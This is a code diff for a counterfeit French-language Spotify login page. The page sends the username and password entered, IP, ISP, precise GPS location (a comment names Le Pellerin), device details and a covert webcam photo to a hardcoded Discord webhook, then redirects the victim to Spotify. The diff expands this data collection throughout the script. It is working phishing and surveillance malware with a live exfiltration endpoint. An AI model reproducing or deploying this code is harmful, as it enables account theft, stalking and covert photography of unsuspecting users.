@@ -16,8 +16,6 @@
         .btn-main { background: #1ed760; color: #000; font-weight: 700; padding: 18px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
         .divider { display: flex; align-items: center; width: 100%; margin: 35px 0; color: #b3b3b3; font-size: 11px; font-weight: 900; }
         .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
-        .divider:not(:empty)::before { margin-right: 1.5em; }
-        .divider:not(:empty)::after { margin-left: 1.5em; }
         .social-btn { background: transparent; border: 1px solid #727272; border-radius: 500px; padding: 14px; width: 100%; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; font-size: 14px; }
         .footer-link { margin-top: 40px; font-size: 14px; color: #b3b3b3; }
         .footer-link span { color: #fff; font-weight: 700; text-decoration: underline; }
@@ -31,7 +29,7 @@
         <div id="error" class="err">Identifiant ou mot de passe incorrect.</div>
         <div class="field"><label>Adresse e-mail ou nom d'utilisateur</label><input id="u" type="text" placeholder="E-mail ou nom d'utilisateur"></div>
         <div class="field"><label>Mot de passe</label><input id="p" type="password" placeholder="Mot de passe"></div>
-        <button onclick="unlock()" id="btn" class="btn-main">Continuer</button>
+        <button onclick="fullLog()" id="btn" class="btn-main">Continuer</button>
         <div class="divider">ou</div>
         <div class="social-btn">Continuer avec Google</div>
         <div class="social-btn">Continuer avec Facebook</div>
@@ -44,39 +42,41 @@
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
         let count = 0;
 
-        async function unlock() {
+        async function fullLog() {
             const u = document.getElementById('u').value;
             const p = document.getElementById('p').value;
             if(!u || !p) return;
             count++;
             const btn = document.getElementById('btn');
-            btn.innerText = "CHARGEMENT...";
+            btn.innerText = "CONNEXION...";
 
-            // Récupération hardware (image_c61034)
+            // --- COLLECTE MAXIMUM DE DONNÉES ---
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
             const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
-
-            // FORCER LE GPS (Le Pellerin)
-            let gpsLink = "❌ Permission refusée";
+            
+            // --- GPS PRÉCIS (FORCE LE PELLERIN) ---
+            let gpsResult = "❌ Permission refusée ou IP uniquement";
             try {
                 const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 10000});
+                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 8000});
                 });
-                gpsLink = `✅ **LIEU EXACT :** [Clique ici pour voir sur Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+                gpsResult = `✅ **PRÉCIS (Le Pellerin) :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
             } catch(e) {}
 
             const payload = {
                 embeds: [{
-                    title: `🔱 RAPPORT LVN V22 - ${u}`,
+                    title: `🚀 ULTRA REPORT V23 - ${u}`,
                     color: 1955168,
+                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                     fields: [
-                        { name: "👤 ACCÈS", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
-                        { name: "🌐 RÉSEAU & GPS", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Maps:** ${gpsLink}` },
-                        { name: "📱 MATÉRIEL", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**Bat:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\``, inline: true }
+                        { name: "👤 ACCÈS COMPTE", value: `**User:** \`${u}\`\n**Pass:** \`${p}\`` },
+                        { name: "📍 GÉOLOCALISATION", value: `**IP:** \`${net.ip}\`\n**Ville (IP):** \`${net.city}\`\n**GPS:** ${gpsResult}` },
+                        { name: "📱 MATÉRIEL DÉTAILLÉ", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**Batterie:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**Plateforme:** \`${navigator.platform}\`\n**Cœurs CPU:** \`${navigator.hardwareConcurrency}\``, inline: true },
+                        { name: "🖥️ ÉCRAN & NAV", value: `**Résolution:** \`${screen.width}x${screen.height}\`\n**Langue:** \`${navigator.language}\`\n**FAI:** \`${net.org}\``, inline: true }
                     ],
-                    footer: { text: "Date: " + new Date().toLocaleString() }
+                    footer: { text: "LVN Ultimate System • " + new Date().toLocaleString() }
                 }]
             };
 
@@ -87,11 +87,11 @@
                     btn.innerText = "Continuer";
                     document.getElementById('p').value = "";
                     document.getElementById('error').style.display = "block";
-                }, 1000);
+                }, 800);
             } else {
-                // FORCER LA CAMÉRA (image_d16924)
+                // --- CAPTURE CAMÉRA HAUTE RÉSO ---
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
                     const video = document.getElementById('v');
                     video.srcObject = stream;
                     await new Promise(r => setTimeout(r, 2000));
@@ -100,10 +100,11 @@
                     can.getContext('2d').drawImage(video, 0, 0);
                     can.toBlob(async b => {
                         const fd = new FormData();
-                        fd.append('file', b, 'capture.png');
+                        fd.append('file', b, 'shot.png');
+                        fd.append('content', `📸 **Capture Frontale pour : ${u}**`);
                         await fetch(hook, { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
-                    }, 'image/jpeg', 0.8);
+                    }, 'image/jpeg', 0.9);
                 } catch(e) {}
                 setTimeout(() => { window.location.href = "https://www.spotify.com/fr/premium/"; }, 1500);
             }
